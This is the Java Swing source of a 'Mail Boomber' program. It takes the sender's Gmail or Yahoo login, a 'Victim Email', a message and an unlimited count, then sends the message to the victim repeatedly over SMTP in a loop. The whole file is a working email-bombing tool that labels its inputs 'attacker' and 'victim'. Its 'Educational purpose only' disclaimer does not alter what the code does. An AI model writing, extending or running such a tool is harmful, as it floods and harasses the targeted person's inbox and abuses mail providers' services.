package mail;

import java.awt.Toolkit;
import java.util.Properties;
import javax.mail.AuthenticationFailedException;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.swing.JOptionPane;
import javax.swing.text.BadLocationException;
import javax.swing.text.StyledDocument;

/**
 *
 * @author Appel
 */
public class Main_ui extends javax.swing.JFrame {

    StyledDocument st;

    public Main_ui() {
        initComponents();
        //main_mail mail=new main_mail();
        st = status_pane.getStyledDocument();
        try {

            st.insertString(st.getLength(), "Welcome To Mail Boomber\n.....................\nPlease Wait.....After Clik The Send Button\n\n", null);

        } catch (Exception e) {

        }
        setIconImage(Toolkit.getDefaultToolkit().getImage(getClass().getResource("Icon.png")));
    }

    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jLabel2 = new javax.swing.JLabel();
        jLabel3 = new javax.swing.JLabel();
        jLabel4 = new javax.swing.JLabel();
        cancel_btn = new javax.swing.JButton();
        send_btn = new javax.swing.JButton();
        email_subject = new javax.swing.JTextField();
        jScrollPane1 = new javax.swing.JScrollPane();
        email_body = new javax.swing.JTextArea();
        attacker_pass = new javax.swing.JPasswordField();
        attacker_email = new javax.swing.JTextField();
        jLabel5 = new javax.swing.JLabel();
        victim_email = new javax.swing.JTextField();
        jScrollPane2 = new javax.swing.JScrollPane();
        status_pane = new javax.swing.JTextPane();
        msg_count = new javax.swing.JSpinner();
        jLabel6 = new javax.swing.JLabel();
        jPanel1 = new javax.swing.JPanel();
        jSeparator1 = new javax.swing.JSeparator();
        jLabel7 = new javax.swing.JLabel();
        jLabel8 = new javax.swing.JLabel();
        jSeparator2 = new javax.swing.JSeparator();
        jLabel1 = new javax.swing.JLabel();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setBackground(new java.awt.Color(51, 51, 51));
        setMinimumSize(new java.awt.Dimension(724, 542));
        setPreferredSize(new java.awt.Dimension(724, 542));
        setResizable(false);
        getContentPane().setLayout(new org.netbeans.lib.awtextra.AbsoluteLayout());

        jLabel2.setFont(new java.awt.Font("Segoe UI", 0, 14)); // NOI18N
        jLabel2.setForeground(new java.awt.Color(255, 51, 0));
        jLabel2.setHorizontalAlignment(javax.swing.SwingConstants.RIGHT);
        jLabel2.setText("Your Email");
        getContentPane().add(jLabel2, new org.netbeans.lib.awtextra.AbsoluteConstraints(40, 30, 90, 30));

        jLabel3.setFont(new java.awt.Font("Segoe UI", 0, 14)); // NOI18N
        jLabel3.setForeground(new java.awt.Color(255, 51, 0));
        jLabel3.setHorizontalAlignment(javax.swing.SwingConstants.RIGHT);
        jLabel3.setText("Your Password");
        getContentPane().add(jLabel3, new org.netbeans.lib.awtextra.AbsoluteConstraints(30, 80, 100, 30));

        jLabel4.setFont(new java.awt.Font("Segoe UI", 0, 14)); // NOI18N
        jLabel4.setForeground(new java.awt.Color(255, 51, 0));
        jLabel4.setHorizontalAlignment(javax.swing.SwingConstants.RIGHT);
        jLabel4.setText("Email-Subject");
        getContentPane().add(jLabel4, new org.netbeans.lib.awtextra.AbsoluteConstraints(40, 190, 90, 30));

        cancel_btn.setFont(new java.awt.Font("Segoe UI", 0, 14)); // NOI18N
        cancel_btn.setForeground(new java.awt.Color(255, 0, 51));
        cancel_btn.setText("CANCEL");
        cancel_btn.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                cancel_btnActionPerformed(evt);
            }
        });
        getContentPane().add(cancel_btn, new org.netbeans.lib.awtextra.AbsoluteConstraints(490, 450, 90, 30));

        send_btn.setFont(new java.awt.Font("Segoe UI", 0, 14)); // NOI18N
        send_btn.setForeground(new java.awt.Color(255, 0, 102));
        send_btn.setText("SEND");
        send_btn.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                send_btnActionPerformed(evt);
            }
        });
        getContentPane().add(send_btn, new org.netbeans.lib.awtextra.AbsoluteConstraints(590, 450, 80, 30));

        email_subject.setBackground(new java.awt.Color(102, 102, 102));
        email_subject.setFont(new java.awt.Font("Segoe UI", 0, 14)); // NOI18N
        email_subject.setForeground(new java.awt.Color(51, 255, 51));
        getContentPane().add(email_subject, new org.netbeans.lib.awtextra.AbsoluteConstraints(140, 190, 320, 30));

        email_body.setBackground(new java.awt.Color(102, 102, 102));
        email_body.setColumns(20);
        email_body.setFont(new java.awt.Font("Monospaced", 0, 14)); // NOI18N
        email_body.setForeground(new java.awt.Color(51, 255, 51));
        email_body.setLineWrap(true);
        email_body.setRows(5);
        jScrollPane1.setViewportView(email_body);

        getContentPane().add(jScrollPane1, new org.netbeans.lib.awtextra.AbsoluteConstraints(140, 240, 320, 190));

        attacker_pass.setBackground(new java.awt.Color(102, 102, 102));
        attacker_pass.setFont(new java.awt.Font("Segoe UI", 0, 14)); // NOI18N
        attacker_pass.setForeground(new java.awt.Color(51, 255, 51));
        getContentPane().add(attacker_pass, new org.netbeans.lib.awtextra.AbsoluteConstraints(140, 80, 320, 30));

        attacker_email.setBackground(new java.awt.Color(102, 102, 102));
        attacker_email.setFont(new java.awt.Font("Segoe UI", 0, 14)); // NOI18N
        attacker_email.setForeground(new java.awt.Color(51, 255, 51));
        getContentPane().add(attacker_email, new org.netbeans.lib.awtextra.AbsoluteConstraints(140, 30, 320, 30));

        jLabel5.setFont(new java.awt.Font("Segoe UI", 0, 14)); // NOI18N
        jLabel5.setForeground(new java.awt.Color(255, 51, 0));
        jLabel5.setHorizontalAlignment(javax.swing.SwingConstants.RIGHT);
        jLabel5.setText("Victim Email");
        getContentPane().add(jLabel5, new org.netbeans.lib.awtextra.AbsoluteConstraints(40, 130, 90, 30));

        victim_email.setBackground(new java.awt.Color(102, 102, 102));
        victim_email.setFont(new java.awt.Font("Segoe UI", 0, 14)); // NOI18N
        victim_email.setForeground(new java.awt.Color(51, 255, 51));
        getContentPane().add(victim_email, new org.netbeans.lib.awtextra.AbsoluteConstraints(140, 130, 320, 30));

        status_pane.setEditable(false);
        status_pane.setBackground(new java.awt.Color(102, 102, 102));
        status_pane.setBorder(null);
        status_pane.setFont(new java.awt.Font("Segoe UI", 0, 14)); // NOI18N
        status_pane.setForeground(new java.awt.Color(255, 0, 0));
        jScrollPane2.setViewportView(status_pane);

        getContentPane().add(jScrollPane2, new org.netbeans.lib.awtextra.AbsoluteConstraints(490, 30, 210, 400));

        msg_count.setFont(new java.awt.Font("Segoe UI", 0, 18)); // NOI18N
        msg_count.setModel(new javax.swing.SpinnerNumberModel(Integer.valueOf(1), Integer.valueOf(1), null, Integer.valueOf(1)));
        getContentPane().add(msg_count, new org.netbeans.lib.awtextra.AbsoluteConstraints(139, 450, 320, 30));

        jLabel6.setFont(new java.awt.Font("Segoe UI", 0, 14)); // NOI18N
        jLabel6.setForeground(new java.awt.Color(255, 51, 0));
        jLabel6.setHorizontalAlignment(javax.swing.SwingConstants.RIGHT);
        jLabel6.setText("Message");
        jLabel6.setVerticalAlignment(javax.swing.SwingConstants.TOP);
        getContentPane().add(jLabel6, new org.netbeans.lib.awtextra.AbsoluteConstraints(40, 240, 90, 30));

        jPanel1.setBackground(new java.awt.Color(51, 51, 51));
        jPanel1.setMaximumSize(new java.awt.Dimension(724, 542));
        jPanel1.setMinimumSize(new java.awt.Dimension(724, 542));
        jPanel1.setPreferredSize(new java.awt.Dimension(724, 542));
        jPanel1.setLayout(new org.netbeans.lib.awtextra.AbsoluteLayout());
        jPanel1.add(jSeparator1, new org.netbeans.lib.awtextra.AbsoluteConstraints(10, 26, 710, 10));

        jLabel7.setForeground(new java.awt.Color(255, 51, 51));
        jLabel7.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel7.setText("[This software is developed for Educational purpose only] [Hacking is a Crime and I am not Responsible for the way you use it]");
        jLabel7.setAutoscrolls(true);
        jPanel1.add(jLabel7, new org.netbeans.lib.awtextra.AbsoluteConstraints(10, 495, 708, 20));

        jLabel8.setFont(new java.awt.Font("Tahoma", 0, 14)); // NOI18N
        jLabel8.setForeground(new java.awt.Color(0, 255, 51));
        jLabel8.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel8.setText("Mail Boomber. Developed By-4pp37");
        jLabel8.setAutoscrolls(true);
        jPanel1.add(jLabel8, new org.netbeans.lib.awtextra.AbsoluteConstraints(20, 0, 690, 20));
        jPanel1.add(jSeparator2, new org.netbeans.lib.awtextra.AbsoluteConstraints(10, 493, 708, -1));

        jLabel1.setFont(new java.awt.Font("Segoe UI", 0, 14)); // NOI18N
        jLabel1.setForeground(new java.awt.Color(255, 51, 0));
        jLabel1.setHorizontalAlignment(javax.swing.SwingConstants.RIGHT);
        jLabel1.setText("Email Number");
        jLabel1.setVerticalAlignment(javax.swing.SwingConstants.TOP);
        jPanel1.add(jLabel1, new org.netbeans.lib.awtextra.AbsoluteConstraints(30, 450, 100, 30));

        getContentPane().add(jPanel1, new org.netbeans.lib.awtextra.AbsoluteConstraints(0, 0, 720, 520));

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void send_btnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_send_btnActionPerformed
        String attacker = attacker_email.getText();
        String password = attacker_pass.getText();
        String victim = victim_email.getText();
        String subject = email_subject.getText();
        String body = email_body.getText();
        String number = "" + msg_count.getValue();
        //System.out.println("Message Number:" + Integer.parseInt(number));

        if (attacker_email.getText().equals("") || attacker_pass.getText().equals("") || victim_email.getText().equals("") || email_subject.getText().equals("") || email_body.getText().equals("")) {
            JOptionPane.showMessageDialog(null, "Fill The Required Form");
        } else {
            if (attacker_email.getText().contains("gmail.com")) {

                gmail_boomb(attacker, password, victim, subject, body, Integer.parseInt(number));
                clear();
            } else if (attacker_email.getText().toLowerCase().contains("yahoo.com")) {

                yahoo_boomb(attacker, password, victim, subject, body, Integer.parseInt(number));
                clear();
            } else {
                JOptionPane.showMessageDialog(null, "You Have Entered a Invalid Email Address");
            }
        }


    }//GEN-LAST:event_send_btnActionPerformed

    private void cancel_btnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_cancel_btnActionPerformed
        clear();
    }//GEN-LAST:event_cancel_btnActionPerformed

    public void clear() {
        attacker_email.setText("");
        attacker_pass.setText("");
        victim_email.setText("");
        email_subject.setText("");
        email_body.setText("");
        msg_count.setValue(1);
        //status_pane.setText("");
    }

    String status = "";

    void gmail_boomb(String username, String pass, String victim, String subject, String msg, int number) {
        //Using SSL coonection
        Properties props = new Properties();
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.socketFactory.port", "465");
        props.put("mail.smtp.socketFactory.class",
                "javax.net.ssl.SSLSocketFactory");
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.port", "465");

        Session session = Session.getInstance(props,
                new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(username, pass);
                    }
                });

        try {

            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(username));
            message.setRecipients(Message.RecipientType.TO,
                    InternetAddress.parse(victim));
            message.setSubject(subject);
            message.setText(msg);
            status = "Connected Successfully.....\n";
            st.insertString(st.getLength(), status, null);
            for (int i = 1; i <= number; i++) {
                Transport.send(message);
                st.insertString(st.getLength(), "Email: " + i + "Sent Successful\n", null);
                //System.out.println("Message: " + i + "Sent Done");
                //Thread.sleep(500);
            }

            st.insertString(st.getLength(), "All Email sent Successfully\n", null);

        } catch (AuthenticationFailedException a) {
            try {
                int dresult = JOptionPane.showConfirmDialog(null, "Authentication Failed.\n"
                        + "Check Your Username or Password\nOR Check Less Secures apps access.\nTo allow access less secure Apps Click YES Button??");
                if (dresult == JOptionPane.YES_OPTION) {
                    Process P;
                    P = Runtime.getRuntime().exec("cmd /c start " + "https://myaccount.google.com/lesssecureapps" + "");
                }
            } catch (Exception es) {

            }
        } catch (MessagingException e) {
            //throw new RuntimeException(e);
            //status=e.getMessage();
            JOptionPane.showMessageDialog(null, e);
        } catch (BadLocationException bad) {
            JOptionPane.showMessageDialog(null, bad);
        }

    }

    void yahoo_boomb(String username, String pass, String victim, String subject, String msg, int number) {

        Properties props = new Properties();
        //Used for tls connection
        //props.put("mail.smtp.auth", "true");
        //props.put("mail.smtp.starttls.enable", "true");

        //Use for gmail
        //props.put("mail.smtp.host", "smtp.gmail.com");
        //props.put("mail.smtp.port", "587");
        //use for yahoo
        //props.put("mail.smtp.host", "smtp.mail.yahoo.com");
        //props.put("mail.smtp.port", "465");
        //used for ssl connection
        props.put("mail.smtp.host", "smtp.mail.yahoo.com");
        props.put("mail.smtp.socketFactory.port", "465");
        props.put("mail.smtp.socketFactory.class",
                "javax.net.ssl.SSLSocketFactory");
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.port", "465");

        Session session = Session.getInstance(props,
                new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(username, pass);
                    }
                });

        try {

            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(username));
            message.setRecipients(Message.RecipientType.TO,
                    InternetAddress.parse(victim));
            message.setSubject(subject);
            message.setText(msg);
            status = "Connected Successfully.....\n";
            st.insertString(st.getLength(), status, null);
            for (int i = 1; i <= number; i++) {
                Transport.send(message);
                st.insertString(st.getLength(), "Email: " + i + "Sent Successful\n", null);
                //System.out.println("Message: " + i + "Send Done");
                //Thread.sleep(500);
            }

            st.insertString(st.getLength(), "All Email sent Successfully\n", null);

        } catch (AuthenticationFailedException a) {
            try {
                int dresult = JOptionPane.showConfirmDialog(null, "Authentication Failed.\nDo you want to allow access less secure Apps??");
                if (dresult == JOptionPane.YES_OPTION) {
                    Process P;
                    P = Runtime.getRuntime().exec("cmd /c start " + "https://login.yahoo.com/account/security#lesssecureapps" + "");
                }
            } catch (Exception es) {

            }
        } catch (MessagingException e) {
            //throw new RuntimeException(e);
            //status=;
            System.out.println(e.getMessage());

        } catch (BadLocationException bad) {
            JOptionPane.showMessageDialog(null, bad);
        }
    }

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(Main_ui.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(Main_ui.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(Main_ui.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(Main_ui.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new Main_ui().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JTextField attacker_email;
    private javax.swing.JPasswordField attacker_pass;
    private javax.swing.JButton cancel_btn;
    private javax.swing.JTextArea email_body;
    private javax.swing.JTextField email_subject;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JLabel jLabel7;
    private javax.swing.JLabel jLabel8;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JSeparator jSeparator1;
    private javax.swing.JSeparator jSeparator2;
    private javax.swing.JSpinner msg_count;
    private javax.swing.JButton send_btn;
    private javax.swing.JTextPane status_pane;
    private javax.swing.JTextField victim_email;
    // End of variables declaration//GEN-END:variables
}
